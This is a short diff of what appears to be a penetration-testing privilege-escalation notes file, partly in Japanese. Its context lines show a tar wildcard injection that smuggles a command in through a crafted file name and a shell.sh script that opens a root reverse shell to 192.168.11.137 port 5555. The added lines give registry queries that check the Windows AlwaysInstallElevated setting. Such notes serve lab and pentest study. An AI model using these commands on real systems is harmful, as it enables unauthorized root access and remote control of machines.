@@ -28,3 +28,8 @@ cat <<EOF> "--checkpoint-action=exec=sh shell.sh"
 cat <<EOF> shell.sh
 > sudo bash -c 'exec bash -i &>/dev/tcp/192.168.11.137/5555 <&1'
 > EOF
+
+#Windows
+AlwaysInstallElevatedの確認には以下のコマンドを使用する。
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
